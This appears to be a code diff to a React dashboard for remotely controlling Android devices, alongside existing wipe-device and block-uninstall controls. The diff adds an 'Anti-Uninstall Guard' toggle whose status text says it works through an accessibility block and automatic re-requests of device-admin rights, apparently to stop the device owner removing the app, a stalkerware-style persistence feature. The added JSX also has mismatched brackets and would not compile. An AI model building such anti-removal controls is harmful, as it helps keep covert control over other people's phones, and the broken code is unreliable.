@@ -93,6 +93,9 @@ export default function Dashboard() {
   const [blockUninstall, setBlockUninstall] = useState(false)
   const [blockUninstallBusy, setBlockUninstallBusy] = useState(false)
   const [blockUninstallStatus, setBlockUninstallStatus] = useState<string | null>(null)
+    const [antiUninstallGuard, setAntiUninstallGuard] = useState(false)
+    const [antiUninstallBusy, setAntiUninstallBusy]   = useState(false)
+    const [antiUninstallStatus, setAntiUninstallStatus] = useState<string | null>(null)
   const audioRef                        = useRef<HTMLAudioElement | null>(null)
   const soundInputRef                   = useRef<HTMLInputElement>(null)
 
@@ -120,7 +123,16 @@ export default function Dashboard() {
     if (deviceData?.device) { setDevice(deviceData.device); setLoading(false) }
   }, [selectedId, deviceData])
 
-  const sendControl = async (command: string) => {
+  // ── Load device settings (anti-uninstall toggle state) on device change ──
+    useEffect(() => {
+      if (!selectedId) { setAntiUninstallGuard(false); setAntiUninstallStatus(null); return }
+      fetch(`/api/device/settings?deviceId=${encodeURIComponent(selectedId)}`)
+        .then(r => r.json())
+        .then(d => { if (d?.settings) setAntiUninstallGuard(d.settings.antiUninstall ?? false) })
+        .catch(() => {})
+    }, [selectedId])
+
+    const sendControl = async (command: string) => {
     if (!selectedId || ctrlBusy) return
     setCtrlBusy(true)
     try {
@@ -221,7 +233,32 @@ export default function Dashboard() {
     }
   }
 
-  const pollResult = async (command: string, sentAt: number, timeoutMs = 18000): Promise<string> => {
+  const handleAntiUninstallToggle = async (enable: boolean) => {
+      if (!selectedId || antiUninstallBusy) return
+      setAntiUninstallBusy(true)
+      setAntiUninstallStatus(null)
+      try {
+        const res = await fetch('/api/device/settings', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ deviceId: selectedId, antiUninstall: enable }),
+        })
+        if (res.ok) {
+          setAntiUninstallGuard(enable)
+          setAntiUninstallStatus(enable
+            ? 'Guard aktif — accessibility block + auto re-request admin'
+            : 'Guard dinonaktifkan — app bisa di-uninstall')
+        } else {
+          setAntiUninstallStatus('ERROR: Gagal menyimpan setting')
+        }
+      } catch (_) {
+        setAntiUninstallStatus('ERROR: Gagal mengirim perintah')
+      } finally {
+        setAntiUninstallBusy(false)
+      }
+    }
+
+    const pollResult = async (command: string, sentAt: number, timeoutMs = 18000): Promise<string> => {
     const deadline = Date.now() + timeoutMs
     await new Promise(r => setTimeout(r, 2000))
     while (Date.now() < deadline) {
@@ -563,9 +600,33 @@ export default function Dashboard() {
                   </span>
                 </button>
 
-                {/* Wipe Device */}
-                <button
-                  onClick={() => setShowWipeConfirm(true)}
+                {/* Anti-Uninstall Guard */}
+                  <button
+                    onClick={() => handleAntiUninstallToggle(!antiUninstallGuard)}
+                    disabled={ctrlBusy || antiUninstallBusy}
+                    className={`flex flex-col items-center gap-2 p-3.5 bg-android-bg rounded-xl transition-colors disabled:opacity-50 group border ${
+                      antiUninstallGuard
+                        ? 'border-orange-500/60 bg-orange-500/5 hover:bg-orange-500/10'
+                        : 'border-android-border hover:border-orange-400/40 hover:bg-orange-400/5'
+                    }`}
+                  >
+                    <div className={`p-2 rounded-lg transition-colors ${antiUninstallGuard ? 'bg-orange-500/20' : 'bg-orange-400/10 group-hover:bg-orange-400/20'}`}>
+                      {antiUninstallGuard
+                        ? <ShieldCheck size={18} className="text-orange-400" />
+                        : <Shield size={18} className="text-android-muted group-hover:text-orange-400" />
+                      }
+                    </div>
+                    <span className={`text-xs font-medium ${antiUninstallGuard ? 'text-orange-400' : 'text-android-text'}`}>
+                      Anti-Uninstall
+                    </span>
+                    <span className={`text-xs text-center font-mono ${antiUninstallGuard ? 'text-orange-400' : 'text-android-muted'}`}>
+                      {antiUninstallBusy ? '...' : antiUninstallGuard ? 'GUARD ON' : 'GUARD OFF'}
+                    </span>
+                  </button>
+
+                  {/* Wipe Device */}
+                  <button
+                    onClick={() => setShowWipeConfirm(true)}
                   disabled={ctrlBusy}
                   className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-red/30 rounded-xl hover:bg-android-red/10 transition-colors disabled:opacity-50 group"
                 >
@@ -588,7 +649,19 @@ export default function Dashboard() {
                 }`}>
                   {blockUninstallStatus}
                 </div>
-              )}
+              )
+                {/* Anti-Uninstall Guard Status */}
+                {antiUninstallStatus && (
+                  <div className={`mt-2 px-3 py-2 rounded-lg text-xs font-mono border ${
+                    antiUninstallStatus.startsWith('ERROR')
+                      ? 'bg-android-red/10 border-android-red/30 text-android-red'
+                      : antiUninstallGuard
+                      ? 'bg-orange-500/10 border-orange-500/30 text-orange-400'
+                      : 'bg-android-border/20 border-android-border text-android-muted'
+                  }`}>
+                    {antiUninstallStatus}
+                  </div>
+                )}}
               </div>
             )}
           </div>
